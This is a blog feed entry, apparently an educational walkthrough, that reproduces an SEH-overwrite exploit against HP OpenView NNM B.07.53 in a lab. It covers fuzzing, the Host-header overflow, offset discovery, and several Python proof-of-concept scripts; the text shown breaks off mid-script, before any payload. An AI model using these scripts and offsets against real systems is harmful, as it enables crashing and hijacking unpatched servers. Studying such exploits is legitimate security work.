<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Greyshell's Diary]]></title>
  <link href="http://greyshell.github.io/atom.xml" rel="self"/>
  <link href="http://greyshell.github.io/"/>
  <updated>2017-08-18T18:17:39-07:00</updated>
  <id>http://greyshell.github.io/</id>
  <author>
    <name><![CDATA[Abhijit S]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[HP OpenView NNM - B.07.53 SEH Bypass]]></title>
    <link href="http://greyshell.github.io/blog/2016/11/07/hpnmm-exploit/"/>
    <updated>2016-11-07T18:23:51-08:00</updated>
    <id>http://greyshell.github.io/blog/2016/11/07/hpnmm-exploit</id>
    <content type="html"><![CDATA[<p>In <a href="https://www.defcon.org/html/defcon-16/dc-16-speakers.html#Aharoni">DEFCON #16</a>, there was an interesting session on HP OpenView NNM  exploitation - <strong><em>&ldquo;from bug to 0 day&rdquo;</em></strong> presented by <em>muts</em>. While watching his walkthrough, I found that particular exploit development process was extremely intense and challenging. To better understand the concepts, I decided to take it as an exercise and reproduce the same in my local environment.</p>

<!-- more -->


<h2>Environment &amp; tools</h2>

<ul>
<li>32 bit windows server 2003-R2-SP2 (disabled <code>DEP</code>, enabled <code>ASLR</code>)</li>
<li>HP NNM release - B.07.53</li>
<li>Immunity Debugger v1.85, mona.py v2.0</li>
<li>Python 2.7 x86, pydbg 32-bit binary, python wmi, pywin32</li>
<li>Spike fuzzer</li>
</ul>


<h2>Web Interface</h2>

<p>Installed HP OpenView NNM (release - B.07.53) in Windows 2003-R2-SP2 platform.</p>

<p>Browsed it’s web interface - <code>http://172.16.232.178:7510/topology/home</code> to verify everything was up and running.</p>

<p><img src="http://greyshell.github.io/downloads/code/2016/11/hpnnm-B.07.53/hpnnm-version.png" alt="hpnnm-version" /></p>

<h2>Fuzz variables</h2>

<p>Tried to crash the application by fuzzing the HTTP request.</p>

<p>Sniffed the HTTP traffic through <code>Wireshark</code>.</p>

<p>Saved the entire browsing session to figure out all valid <code>requests headers</code> and <code>parameters</code>.</p>

<p><img src="http://greyshell.github.io/downloads/code/2016/11/hpnnm-B.07.53/http-sniff.png" alt="http-sniff" /></p>

<p>Created a <code>spike</code> template - <code>http.spk</code> to reproduce the similar HTTP request with <code>6 fuzz points/variables</code>.</p>

<p><img src="http://greyshell.github.io/downloads/code/2016/11/hpnnm-B.07.53/http-spike.png" alt="http-spike" /></p>

<h2>Process - ovas.exe</h2>

<p><code>ovas.exe</code> process was responsible for listening connection on TCP port <code>7150</code>.</p>

<p><img src="http://greyshell.github.io/downloads/code/2016/11/hpnnm-B.07.53/ovas-process.png" alt="ovas-process" /></p>

<h2>Fuzz &amp; Crash</h2>

<p>Attached and run the <code>ovas.exe</code> process inside Immunity.</p>

<p>Started fuzzing through Spike HTTP template <code>http.spk</code>.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>generic_send_tcp 172.16.232.178 7510 http.spk 0 0</span></code></pre></td></tr></table></div></figure>


<p>While fuzzing the 2nd variable - s_string_variable(<code>172.16.232.178</code>), application crashed.</p>

<p>Verified and confirmed the same by inspecting the <code>host header</code> in memory dump.</p>

<p><img src="http://greyshell.github.io/downloads/code/2016/11/hpnnm-B.07.53/crash.png" alt="crash" /></p>

<p>Analysing the <code>crash scenario</code></p>

<ul>
<li><code>SEH</code> and <code>nSEH</code> both were overwritten by fuzz buffer “A”.</li>
<li><code>ESP + 0x4C</code> pointed at the <code>1025-th byte</code> of our fuzz buffer.</li>
<li>Approximate <code>2048 bytess</code> buffer was used for this crash.</li>
<li>It would possible to control / overwrite the EIP after passing the exception to the program.</li>
</ul>


<h2>The bug</h2>

<p>HP OpenView NNM - B.07.53 did not validate the value of <code>host</code> header during processing any <code>unauthenticated</code> HTTP request. As a result, an attacker could crash the application and overwrite the <code>SEH chain</code> by appending a large buffer after <code>host header</code>.</p>

<h2>Proof of concept</h2>

<p>Restarted <code>ovas.exe</code> and attached it within Immunity.</p>

<p>Set up the working directory of <code>mona.py</code>.</p>

<p><code>!mona config -set workingfolder c:\mona-logs\%p</code></p>

<p>Sent the <code>2048 bytess</code> buffer to verify and reproduce the same crash with a stand alone python script.</p>

<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class='py'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'>
</span><span class='line'><span class="c"># file name: hpnnm-B.07.53-exploit-v1.py</span>
</span><span class='line'><span class="c"># author: greyshell</span>
</span><span class='line'><span class="c"># description: crash with buffer length = 2048 (identified during fuzzing)</span>
</span><span class='line'>
</span><span class='line'><span class="kn">import</span> <span class="nn">socket</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">os</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">sys</span>
</span><span class='line'>
</span><span class='line'><span class="c"># original crash buff length = 2048</span>
</span><span class='line'><span class="n">buff</span> <span class="o">=</span> <span class="mi">2048</span> <span class="o">*</span> <span class="s">&quot;A&quot;</span>
</span><span class='line'><span class="n">crash</span> <span class="o">=</span> <span class="n">buff</span>
</span><span class='line'>
</span><span class='line'><span class="nb">buffer</span> <span class="o">=</span> <span class="s">&quot;GET /topology/homeBaseView HTTP/1.1</span><span class="se">\r\n</span><span class="s">&quot;</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="s">&quot;Host: &quot;</span> <span class="o">+</span> <span class="n">crash</span> <span class="o">+</span> <span class="s">&quot;</span><span class="se">\r\n</span><span class="s">&quot;</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="s">&quot;Content-Type: application/x-www-form-urlencoded</span><span class="se">\r\n</span><span class="s">&quot;</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="s">&quot;User-Agent: Mozilla/4.0 (Windows XP 5.1) Java/1.6.0_03</span><span class="se">\r\n</span><span class="s">&quot;</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="s">&quot;Content-Length: 1048580</span><span class="se">\r\n\r\n</span><span class="s">&quot;</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;[*] Sending evil HTTP request to HP NNM -B.07.53, buffer length: &quot;</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">buff</span><span class="p">)</span>
</span><span class='line'><span class="n">expl</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span> <span class="p">)</span>
</span><span class='line'><span class="n">expl</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&quot;172.16.232.178&quot;</span><span class="p">,</span> <span class="mi">7510</span><span class="p">))</span>
</span><span class='line'><span class="n">expl</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="nb">buffer</span><span class="p">)</span>
</span><span class='line'><span class="n">expl</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<h2>Best buffer length</h2>

<p>Started playing with different buffer length and tried to figure out the maximum length of the fuzz buffer that produces same crash.</p>

<p>After analysing different crashes, it was obeserved that <code>3780 bytes</code> buffer would be a good choice.</p>

<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class='py'><span class='line'><span class="c">#!/usr/bin/python </span>
</span><span class='line'>
</span><span class='line'><span class="c"># file name: hpnnm-B.07.53-exploit-v2.py</span>
</span><span class='line'><span class="c"># author: greyshell</span>
</span><span class='line'><span class="c"># description: crash ovas.exe with best buffer length = 3780</span>
</span><span class='line'>
</span><span class='line'><span class="kn">import</span> <span class="nn">socket</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">os</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">sys</span>
</span><span class='line'>
</span><span class='line'><span class="c"># max crash buff length = 3780</span>
</span><span class='line'><span class="n">buff</span> <span class="o">=</span> <span class="mi">3780</span> <span class="o">*</span> <span class="s">&quot;A&quot;</span>
</span><span class='line'><span class="n">crash</span> <span class="o">=</span> <span class="n">buff</span>
</span><span class='line'>
</span><span class='line'><span class="nb">buffer</span> <span class="o">=</span> <span class="s">&quot;GET /topology/homeBaseView HTTP/1.1</span><span class="se">\r\n</span><span class="s">&quot;</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="s">&quot;Host: &quot;</span> <span class="o">+</span> <span class="n">crash</span> <span class="o">+</span> <span class="s">&quot;</span><span class="se">\r\n</span><span class="s">&quot;</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="s">&quot;Content-Type: application/x-www-form-urlencoded</span><span class="se">\r\n</span><span class="s">&quot;</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="s">&quot;User-Agent: Mozilla/4.0 (Windows XP 5.1) Java/1.6.0_03</span><span class="se">\r\n</span><span class="s">&quot;</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="s">&quot;Content-Length: 1048580</span><span class="se">\r\n\r\n</span><span class="s">&quot;</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;[*] Sending evil HTTP request to HP NNM -B.07.53, buffer length: &quot;</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">buff</span><span class="p">)</span>
</span><span class='line'><span class="n">expl</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span> <span class="p">)</span>
</span><span class='line'><span class="n">expl</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&quot;172.16.232.178&quot;</span><span class="p">,</span> <span class="mi">7510</span><span class="p">))</span>
</span><span class='line'><span class="n">expl</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="nb">buffer</span><span class="p">)</span>
</span><span class='line'><span class="n">expl</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<h2>nSEH &amp; SEH offsets</h2>

<p>Created <code>3780 bytes</code> unique pattern through <code>mona.py</code>.</p>

<p><code>!mona pattern_create 3780</code></p>

<p>Then copied those bytess from <code>C:\mona-logs\ovas\pattern.txt</code> and updated the skeleton code.</p>

<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
</pre></td><td class='code'><pre><code class='py'><span class='line'><span class="c">#!/usr/bin/python </span>
</span><span class='line'>
</span><span class='line'><span class="c"># file name: hpnnm-B.07.53-exploit-v3.py</span>
</span><span class='line'><span class="c"># author: greyshell</span>
</span><span class='line'><span class="c"># description: find the offset for nSEH and SEH through unique pattern</span>
</span><span class='line'>
</span><span class='line'><span class="kn">import</span> <span class="nn">socket</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">os</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">sys</span>
</span><span class='line'>
</span><span class='line'><span class="c"># max crash buff length = 3780</span>
</span><span class='line'>
</span><span class='line'><span class="c"># !mona pattern_create 3780</span>
</span><span class='line'>
</span><span class='line'><span class="n">buff</span> <span class="o">=</span> <span class="p">(</span><span class="s">&quot;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9Dw0Dw1Dw2Dw3Dw4Dw5Dw6Dw7Dw8Dw9Dx0Dx1Dx2Dx3Dx4Dx5Dx6Dx7Dx8Dx9Dy0Dy1Dy2Dy3Dy4Dy5Dy6Dy7Dy8Dy9Dz0Dz1Dz2Dz3Dz4Dz5Dz6Dz7Dz8Dz9Ea0Ea1Ea2Ea3Ea4Ea5Ea6Ea7Ea8Ea9Eb0Eb1Eb2Eb3Eb4Eb5Eb6Eb7Eb8Eb9Ec0Ec1Ec2Ec3Ec4Ec5Ec6Ec7Ec8Ec9Ed0Ed1Ed2Ed3Ed4Ed5Ed6Ed7Ed8Ed9Ee0Ee1Ee2Ee3Ee4Ee5Ee6Ee7Ee8Ee9Ef0Ef1Ef2Ef3Ef4Ef5Ef6Ef7Ef8Ef9Eg0Eg1Eg2Eg3Eg4Eg5Eg6Eg7Eg8Eg9Eh0Eh1Eh2Eh3Eh4Eh5Eh6Eh7Eh8Eh9Ei0Ei1Ei2Ei3Ei4Ei5Ei6Ei7Ei8Ei9Ej0Ej1Ej2Ej3Ej4Ej5Ej6Ej7Ej8Ej9Ek0Ek1Ek2Ek3Ek4Ek5Ek6Ek7Ek8Ek9El0El1El2El3El4El5El6El7El8El9Em0Em1Em2Em3Em4Em5Em6Em7Em8Em9En0En1En2En3En4En5En6En7En8En9Eo0Eo1Eo2Eo3Eo4Eo5Eo6Eo7Eo8Eo9Ep0Ep1Ep2Ep3Ep4Ep5Ep6Ep7Ep8Ep9Eq0Eq1Eq2Eq3Eq4Eq5Eq6Eq7Eq8Eq9Er0Er1Er2Er3Er4Er5Er6Er7Er8Er9Es0Es1Es2Es3Es4Es5Es6Es7Es8Es9Et0Et1Et2Et3Et4Et5Et6Et7Et8Et9Eu0Eu1Eu2Eu3Eu4Eu5Eu6Eu7Eu8Eu9Ev0Ev1Ev2Ev3Ev4Ev5Ev6Ev7Ev8Ev9&quot;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="n">crash</span> <span class="o">=</span> <span class="n">buff</span>
</span><span class='line'>
</span><span class='line'><span class="nb">buffer</span> <span class="o">=</span> <span class="s">&quot;GET /topology/homeBaseView HTTP/1.1</span><span class="se">\r\n</span><span class="s">&quot;</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="s">&quot;Host: &quot;</span> <span class="o">+</span> <span class="n">crash</span> <span class="o">+</span> <span class="s">&quot;</span><span class="se">\r\n</span><span class="s">&quot;</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="s">&quot;Content-Type: application/x-www-form-urlencoded</span><span class="se">\r\n</span><span class="s">&quot;</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="s">&quot;User-Agent: Mozilla/4.0 (Windows XP 5.1) Java/1.6.0_03</span><span class="se">\r\n</span><span class="s">&quot;</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="s">&quot;Content-Length: 1048580</span><span class="se">\r\n\r\n</span><span class="s">&quot;</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;[*] Sending evil HTTP request to HP NNM -B.07.53, buffer length: &quot;</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">buff</span><span class="p">)</span>
</span><span class='line'><span class="n">expl</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span> <span class="p">)</span>
</span><span class='line'><span class="n">expl</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&quot;172.16.232.178&quot;</span><span class="p">,</span> <span class="mi">7510</span><span class="p">))</span>
</span><span class='line'><span class="n">expl</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="nb">buffer</span><span class="p">)</span>
</span><span class='line'><span class="n">expl</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>During crash, inspected the <code>fs:[0] register / SEH chain</code>.</p>

<p>Selected the <code>first corrupted-entry</code> and followed address in stack.</p>

<p><img src="http://greyshell.github.io/downloads/code/2016/11/hpnnm-B.07.53/overflow-seh-chain.png" alt="overflow-seh-chain" /></p>

<p>It was observed that</p>

<ul>
<li><code>nSEH</code> was overwritten with pattern => <code>32674531</code></li>
<li><code>SEH</code> was overwritten with pattern => <code>45336745</code></li>
</ul>


<p>Leveraged mona.py to find the correct offsets:</p>

<ul>
<li><code>nSEH</code> offset: <code>!mona pattern_offset  32674531</code> => 3305</li>
<li><code>SEH</code> offset: <code>!mona pattern_offset  45336745</code> =>   3309</li>
</ul>


<p><img src="http://greyshell.github.io/downloads/code/2016/11/hpnnm-B.07.53/seh-offset-found.png" alt="finding-seh-offset" /></p>

<p>To verify those offsets, divided the original buffer into four different blocks - <code>A</code>, <code>B</code>, <code>C</code>, <code>D</code> and updated the skeleton code with identified offset values.</p>

<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
</pre></td><td class='code'><pre><code class='py'><span class='line'><span class="c">#!/usr/bin/python </span>
</span><span class='line'>
</span><span class='line'><span class="c"># file name: hpnnm-B.07.53-exploit-v4.py</span>
</span><span class='line'><span class="c"># author: greyshell</span>
</span><span class='line'><span class="c"># description: verifiying nseh and seh offset</span>
</span><span class='line'>
</span><span class='line'><span class="kn">import</span> <span class="nn">socket</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">os</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">sys</span>
</span><span class='line'>
</span><span class='line'><span class="c"># max crash buff length = 3780</span>
</span><span class='line'><span class="c"># nSEH offset = 3305, SEH offset = 3309</span>
</span><span class='line'><span class="n">total_len</span> <span class="o">=</span> <span class="mi">3780</span>
</span><span class='line'>
</span><span class='line'><span class="n">buff_initial</span> <span class="o">=</span> <span class="s">&quot;A&quot;</span> <span class="o">*</span> <span class="mi">3305</span>
</span><span class='line'>
</span><span class='line'><span class="n">nseh</span> <span class="o">=</span> <span class="s">&quot;BBBB&quot;</span>
</span><span class='line'><span class="n">seh</span> <span class="o">=</span> <span class="s">&quot;CCCC&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="n">buff_last</span> <span class="o">=</span> <span class="s">&quot;D&quot;</span> <span class="o">*</span> <span class="p">(</span><span class="n">total_len</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">buff_initial</span><span class="p">)</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">nseh</span><span class="p">)</span> <span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">seh</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="n">crash</span> <span class="o">=</span> <span class="n">buff_initial</span> <span class="o">+</span> <span class="n">nseh</span> <span class="o">+</span> <span class="n">seh</span> <span class="o">+</span> <span class="n">buff_last</span>
</span><span class='line'>
</span><span class='line'><span class="nb">buffer</span> <span class="o">=</span> <span class="s">&quot;GET /topology/homeBaseView HTTP/1.1</span><span class="se">\r\n</span><span class="s">&quot;</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="s">&quot;Host: &quot;</span> <span class="o">+</span> <span class="n">crash</span> <span class="o">+</span> <span class="s">&quot;</span><span class="se">\r\n</span><span class="s">&quot;</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="s">&quot;Content-Type: application/x-www-form-urlencoded</span><span class="se">\r\n</span><span class="s">&quot;</span>
